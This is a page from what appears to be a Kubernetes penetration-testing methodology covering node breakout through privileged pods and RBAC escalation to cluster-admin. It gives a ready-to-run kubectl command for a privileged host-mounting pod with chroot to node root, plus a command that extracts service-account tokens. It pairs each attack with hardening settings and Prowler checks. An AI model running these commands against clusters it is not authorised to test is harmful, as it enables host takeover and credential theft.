# Kubernetes · Phase 3 — Privilege Escalation & Node Breakout

> OWASP [K01 Insecure Workload Configurations](../_kubernetes-base/K01-Insecure-Workload-Configurations.md)
> + [K02 Overly Permissive Authorization](../_kubernetes-base/K02-Overly-Permissive-Authorization-Configurations.md).
> Two escalation axes: **workload misconfig → break out to the node**, and
> **RBAC → cluster-admin**.

## Node breakout via workload misconfiguration (K01)
#### T1611 Escape to Host
- **Component/sink:** a Pod you can create/exec in with a dangerous setting.
  ```sh
  kubectl auth can-i create pods                        # if yes, you can craft one
  # privileged pod that mounts the host filesystem:
  # spec.containers[].securityContext.privileged: true ; volume hostPath: /
  kubectl run x --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}],"command":["sleep","1d"]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
  kubectl exec x -- chroot /host sh                      # root on the node
  ```
- Also: `privileged`, `hostPID/hostNetwork/hostIPC`, `hostPath` mounts, added
  capabilities (`SYS_ADMIN`), unconfined seccomp/AppArmor, `allowPrivilege-
  Escalation`.
- **Positive (secure):** Pod Security Admission `restricted`; `runAsNonRoot`;
  no privileged/hostPath; seccomp `RuntimeDefault`. Prowler `core_*` (e.g.
  `core_minimize_privileged_containers`, `core_containers_privilege_escalation_disabled`,
  `core_minimize_hostpath_mounts`).
- **Negative (vulnerable):** you `chroot` onto the node → read every pod's
  secrets, the kubelet creds, and the node's **cloud credentials**
  ([Phase 5](05-cluster-to-cloud.md)).

## RBAC privilege escalation (K02)
- **Component/sink:** RBAC verbs that let you become more powerful:

| Verb / permission | Escalation |
|---|---|
| `create pods` (+ a privileged SA in ns) | run a pod using a more privileged service account |
| `create pods/exec` | exec into existing privileged pods |
| `get/list secrets` | read SA tokens of powerful accounts → impersonate |
| `escalate`/`bind` on roles | grant yourself cluster-admin |
| `impersonate` users/groups/SAs | act as cluster-admin directly |
| `create` on `*` / `*` verbs | effectively cluster-admin |

```sh
kubectl auth can-i --list                      # find the verb
kubectl get secret <sa-token-secret> -o jsonpath='{.data.token}' | base64 -d   # steal a token
```
- **Positive (secure):** least-privilege Roles; no wildcard; `escalate`/`bind`/
  `impersonate` not granted. Prowler `rbac_minimize_wildcard_use_roles`,
  `rbac_minimize_secret_access`, `rbac_cluster_admin_usage`.
- **Negative (vulnerable):** a path to cluster-admin → full cluster control.

---
*Next: [Phase 4 — Lateral Movement](04-lateral-movement.md).*
